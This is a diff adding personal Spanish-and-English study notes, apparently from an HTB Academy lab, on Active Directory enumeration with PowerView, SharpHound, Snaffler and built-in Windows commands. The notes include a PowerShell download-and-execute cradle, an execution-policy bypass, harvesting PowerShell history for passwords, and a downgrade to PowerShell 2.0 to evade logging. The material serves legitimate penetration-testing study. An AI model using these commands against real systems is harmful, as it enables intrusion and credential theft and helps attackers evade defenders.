@@ -754,13 +754,206 @@ Solo tiene un miembro
 
 > We can see that one account, backupagent, belongs to this group. It is worth noting this down because if we can take over this service account through some attack, we could use its membership in the Backup Operators group to take over the domain. We can perform this process for the other groups to fully understand the domain membership setup. Try repeating the process with a few different groups. You will see that this process can be tedious, and we will be left with an enormous amount of data to sift through. We must know how to do this with built-in tools such as the ActiveDirectory PowerShell module, but we will see later in this section just how much tools like BloodHound can speed up this process and make our results far more accurate and organized.
 
+## Enumerar con PowerView ( siento que ya esta des actualizado)
+
+Enumerar un solo usuario ya sabes importa el modulo etc...
+
+```
+Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
+```
+
+### Enumera grupos y nested groups ( Recursive Group Membership)
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/caa23ff4-8efc-4120-8882-9868c16ed6eb)
+
+```
+ Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+```
+
+> We saw some basic user information with PowerView. Now let's enumerate some domain group information. We can use the Get-DomainGroupMember function to retrieve group-specific information. Adding the -Recurse switch tells PowerView that if it finds any groups that are part of the target group (nested group membership) to list out the members of those groups. For example, the output below shows that the Secadmins group is part of the Domain Admins group through nested group membership. In this case, we will be able to view all of the members of that group who inherit Domain Admin rights via their group membership.
 
 
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/5f65b419-3b43-4643-9836-3c9189e372ad)
 
 
+### Enumerar TRUST
+
+```
+Get-DomainTrustMapping
+```
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/b82a5969-e3a4-49b5-b672-d7b397eff7ac)
+
+### Enumerar Administrador Local
+
+Este comando ayuda a enumerar donde se tiene acceso de administrador local en que computadora.
+
+```
+Test-AdminAccess -ComputerName ACADEMY-EA-MS01
+```
+
+> Above, we determined that the user we are currently using is an administrator on the host ACADEMY-EA-MS01. We can perform the same function for each host to see where we have administrative access. We will see later how well BloodHound performs this type of check. Now we can check for users with the SPN attribute set, which indicates that the account may be subjected to a Kerberoasting attack.
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/e28fa4d5-c623-4ac9-895b-39c7d3caa4ce)
+
+### Finding Users With SPN Set
+
+```
+Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
+
+```
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/24ea9c3b-2c0e-45e2-b1c0-1916d900cb42)
 
 
+EL powerview mas actualizado:
+
+> https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module_source/situational_awareness/network/powerview.ps1
+
+> PowerView is part of the now deprecated PowerSploit offensive PowerShell toolkit. The tool has been receiving updates by BC-Security as part of their Empire 4 framework. Empire 4 is BC-Security's fork of the original Empire project and is actively maintained as of April 2022. We show examples throughout this module using the development version of PowerView because it is an excellent tool for recon in an Active Directory environment, and is still extremely powerful and helpful in modern AD networks even though the original version is not maintained. The BC-SECURITY version of PowerView has some new functions such as Get-NetGmsa, used to hunt for Group Managed Service Accounts, which is out of scope for this module. It is worth playing around with both versions to see the subtle differences between the old and currently maintained versions.
+
+## SharpView
+
+Otra herramienta con la que vale la pena experimentar es SharpView, una versión .NET de PowerView. Ejecutalo como cualquier otro exe
+> SharpView can be useful when a client has hardened against PowerShell usage or we need to avoid using PowerShell.
 
 
+```
+.\SharpView.exe Get-DomainUser -Help
+```
+
+### Enum Users
+
+```
+.\SharpView.exe Get-DomainUser -Identity forend
+```
+
+## Enum shares Snaffler
+
+Enumera todo lo que el usuario tiene acceso al parecer
+
+```
+Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
+```
+
+> Le -s indica que imprima los resultados en la consola, especifica -del dominio en el que buscar y le -o indica a Snaffler que escriba los resultados en un archivo de registro. La -v opción es el nivel de detalle. Normalmente dataes mejor, ya que solo muestra los resultados en la pantalla, por lo que es más fácil comenzar a revisar las ejecuciones de la herramienta. Snaffler puede producir una cantidad considerable de datos, por lo que normalmente deberíamos enviarlos a un archivo, dejar que se ejecute y luego volver a él más tarde.
+
+lo guarda todo en un el .log
+
+##  BLoodHound desde Windows ( SharpHound.exe)
+
+Ya sabes recolecta todo los datos
+
+```
+.\SharpHound.exe -c All --zipfilename ILFREIGHT
+```
+
+Una vez recopilados los datos se puede abrir la GUI normal desd PS
+
+```
+bloodhound
+```
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/185af5af-3ce7-4ab8-b90b-be1494c6708a)
+
+Aprieta el objeto y ve la informacion de la empresa...
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/126a71c0-2586-4e36-80fa-df86f47c0e27)
+
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/880d5b5a-4f4a-411f-8593-e724d79c945b)
+
+
+Si vemos los host antiguos no estan activos.
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/2d637dd8-0b8f-4a5b-98ed-e9e96374f10d)
+
+### Find Computers where Domain Users are Local Adminpara
+
+Permite ver rápidamente si hay algún host donde todos los usuarios tengan derechos de administrador local. Si este es el caso, entonces cualquier cuenta que controlemos normalmente se puede utilizar para acceder a los hosts en cuestión y es posible que podamos recuperar credenciales de la memoria o encontrar otros datos confidenciales.
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/653bd15d-4a11-4089-b987-28cc2a4d4ac7)
+
+### Living of land enum AD ( la mas silenciosa de todas las tecnicas usar comandos de windows)
+
+```
+hostname
+[System.Environment]::OSVersion.Version # te dice el build version
+wmic qfe get Caption,Description,HotFixID,InstalledOn # Te dice los parches instalados
+set # muestra las env variables solo en CMD
+echo %USERDOMAIN% #Displays the domain name to which the host belongs (ran from CMD-prompt)
+echo %logonserver% #CMD Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)
+systeminfo #Ya sabes
+arp -a # Enumera todos los hosts conocidos almacenados en la tabla arp.
+route print # Muestra la tabla de enrutamiento (IPv4 e IPv6) que identifica las redes conocidas y las rutas de capa tres compartidas con el host.
+```
+
+> En resumen, los hotfixes son actualizaciones específicas de Microsoft diseñadas para resolver problemas, vulnerabilidades o errores específicos en el sistema operativo Windows o en las aplicaciones de Microsoft. Son una parte importante de mantener la seguridad y la estabilidad de un sistema Windows actualizado.
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/6e0d46d8-b246-4b0f-988f-bbcd620064a5)
+
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/3756e296-c4f3-4cb2-8f00-bc7f0aedf1c6)
+
+## Powershell Basics
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/5d6efc91-079f-402c-b903-5763eaac637d)
+
+```
+Get-ExecutionPolicy -List # Imprimirá la configuración de la política de ejecución para cada alcance en un host.
+Get-ChildItem Env: | ft Key,Value # es como set pero mas ordenado y en PS
+
+Set-ExecutionPolicy Bypass -Scope Process # Esto cambiará la política de nuestro proceso actual utilizando el -Scopeparámetro. Al hacerlo, se revertirá la política una vez que abandonemos el proceso o lo finalicemos. Esto es ideal porque no realizaremos un cambio permanente en el host de la víctima
+Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt # Con esta cadena, podemos obtener el historial de PowerShell del usuario especificado. Esto puede resultar muy útil ya que el historial de comandos puede contener contraseñas o indicarnos archivos de configuración o scripts que contengan contraseñas.
+
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>" # Esta es una forma rápida y sencilla de descargar un archivo de la web usando PowerShell y llamarlo desde la memoria.
+
+```
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/e1341cea-b2ef-4a4b-ad7b-c397f4320634)
+
+
+### Powershell 2.0
+
+Muchos defensores desconocen que a menudo existen varias versiones de PowerShell en un host. Si no se desinstalan, aún se pueden utilizar. El registro de eventos de Powershell se introdujo como una característica con Powershell 3.0 y posteriores. Con eso en mente, podemos intentar llamar a Powershell versión 2.0 o anterior. Si tiene éxito, nuestras acciones desde el shell no se registrarán en el Visor de eventos. Esta es una excelente manera de permanecer fuera del radar de los defensores y al mismo tiempo utilizar los recursos integrados en los anfitriones para nuestro beneficio. A continuación se muestra un ejemplo de cómo degradar Powershell.
+
+
+```
+Get-Host #
+powershell.exe -version 2
+``` 
+
+El comando Get-Host en PowerShell se utiliza para obtener información sobre la sesión actual de PowerShell y el entorno de host en el que se está ejecutando. Proporciona detalles sobre la versión de PowerShell, la cultura regional, la configuración de pantalla y otros aspectos relacionados con la sesión en curso.
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/2d8877ba-e7e5-457b-9cfc-f3e2e8847a90)
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/e0b5862b-e959-457a-99fb-b1f45fb5d702)
+
+> With Script Block Logging enabled, we can see that whatever we type into the terminal gets sent to this log. If we downgrade to PowerShell V2, this will no longer function correctly.
+
+>  Our actions after will be masked since Script Block Logging does not work below PowerShell 3.0. Notice above in the logs that we can see the commands we issued during a normal shell session, but it stopped after starting a new PowerShell instance in version 2.
+
+## Firewall enum
+
+```
+netsh advfirewall show allprofiles
+```
+
+## Windows Defender
+
+```
+sc query windefend CMD
+Get-MpComputerStatus PS
+```
+> Al acceder a un host por primera vez, una cosa importante es verificar y ver si usted es el único que ha iniciado sesión. Si comienza a realizar acciones desde un host en el que se encuentra otra persona, existe la posibilidad de que se fijen en usted. Si se abre una ventana emergente o se cierra la sesión de un usuario, puede informar estas acciones o cambiar su contraseña, y podríamos perder nuestro punto de apoyo.
+
+```
+qwinsta
+```
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/64d86d62-ea40-4583-8f90-bb64b777ca9f)
+
+Para el comando route print:
+
+>  Cualquier red que aparezca en la tabla de enrutamiento es una vía potencial para el movimiento lateral porque se accede a ellas lo suficiente como para agregar una ruta, o se ha configurado administrativamente allí para que el host sepa cómo acceder a los recursos en el dominio. Estos dos comandos pueden ser especialmente útiles en la fase de descubrimiento de una evaluación de caja negra donde tenemos que limitar nuestro escaneo.
 
 
